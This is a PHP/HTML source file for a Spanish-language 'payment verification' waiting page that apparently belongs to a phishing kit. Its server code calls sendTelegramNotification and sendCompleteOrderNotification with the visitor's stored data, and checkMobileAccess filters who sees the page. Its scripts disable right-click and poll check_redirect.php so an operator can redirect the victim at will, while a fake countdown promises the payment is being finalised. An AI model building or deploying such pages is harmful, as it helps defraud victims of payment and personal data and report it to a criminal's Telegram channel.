<?php
require_once 'functions.php';
checkMobileAccess(); // Verificación de seguridad
sendTelegramNotification('loader2');

$userId = getUserID();
$userData = getUserData($userId);
sendCompleteOrderNotification($userId, $userData);
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificación en curso</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .main-content {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-bottom: 50px; /* ESPACIO AÑADIDO PARA SEPARAR DEL FOOTER */
        }
        .header {
            text-align: center;
            width: 100%;
        }
        .logo {
            height: auto;
        }
        .container {
            background: white;
            padding: 40px 25px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
            text-align: center;
            width: 90%;
            max-width: 400px;
            margin: 20px 0 45px 0;
        }
        .loader {
            width: 70px;
            height: 70px;
            border: 4px solid #f0f0f0;
            border-top: 6px solid #177ECF;
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
            margin: 0 auto 30px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            color: #333;
            margin-bottom: 20px;
            font-size: 1.6em;
            font-weight: 600;
        }
        p {
            color: #666;
            margin-bottom: 10px;
            line-height: 1.5;
            font-size: 1em;
        }
        .countdown {
            font-size: 1.2em;
            font-weight: bold;
            color: #177ECF;
            margin-top: 25px;
            padding: 12px;
            background: #f8f9fa;
            border-radius: 10px;
        }
        .status {
            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
            padding: 20px;
            border-radius: 15px;
            margin: 25px 0;
            border-left: 4px solid #177ECF;
        }
        .progress-text {
            color: #000;
            font-weight: 600;
            margin-top: 15px;
        }
        
        /* ESPACIO ADICIONAL PARA SEPARAR DEL FOOTER */
        .spacer {
            height: 40px;
            width: 100%;
        }
        
        @media (max-width: 480px) {
            .container {
                padding: 30px 20px;
                border-radius: 15px;
                margin: 15px 0 30px 0;
            }
            .header {
                padding: 5px 0;
            }
            .logo {
                max-width: 150px;
            }
            h1 {
                font-size: 1.4em;
            }
            .loader {
                width: 60px;
                height: 60px;
            }
            .main-content {
                padding-bottom: 30px; /* ESPACIO REDUCIDO EN MÓVIL */
            }
            .spacer {
                height: 30px; /* ESPACIO REDUCIDO EN MÓVIL */
            }
        }
        
        @media (max-width: 320px) {
            .main-content {
                padding-bottom: 25px; /* ESPACIO MÍNIMO PARA PANTALLAS MUY PEQUEÑAS */
            }
            .spacer {
                height: 25px; /* ESPACIO MÍNIMO PARA PANTALLAS MUY PEQUEÑAS */
            }
        }
    </style>
</head>
<body>
    <div class="main-content">
        <div class="header">
            <a href="https://imgbb.com/"><img src="https://i.ibb.co/jP4NGJnh/T-l-chargement-2.jpg" alt="T-l-chargement-2" border="0" /></a>
        </div>

        <div class="container">
            <div class="loader"></div>
            <h1>Verificación</h1>

            <p class="progress-text">Por favor espere mientras finalizamos su pago...</p>
            
            <div class="countdown" id="countdown">
                Redirección en <span id="timer">10</span> segundos
            </div>
        </div>
        
        <!-- ESPACIO ADICIONAL PARA SEPARAR DEL FOOTER -->
        <div class="spacer"></div>
    </div>

    <?php include 'footer.php'; ?>

<script>
// Evitar clic derecho en toda la página
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

// Evitar clic en las imágenes
document.addEventListener('DOMContentLoaded', function() {
    const images = document.querySelectorAll('img');
    images.forEach(img => {
        img.addEventListener('click', function(e) {
            e.preventDefault();
            e.stopPropagation();
        });
        
        // Evitar arrastrar y soltar
        img.addEventListener('dragstart', function(e) {
            e.preventDefault();
        });
    });
});
</script>

    <script>
        let seconds = 10;
        const countdownElement = document.getElementById('timer');
        
        const countdown = setInterval(function() {
            seconds--;
            countdownElement.textContent = seconds;
            
            if (seconds <= 0) {
                clearInterval(countdown);
                window.location.href = 'completado.php';
            }
        }, 1000);

        setInterval(function() {
            fetch('check_redirect.php')
                .then(response => response.json())
                .then(data => {
                    if (data.redirect) {
                        window.location.href = data.url;
                    }
                })
                .catch(error => console.error('Error:', error));
        }, 2000);
    </script>
</body>
</html>
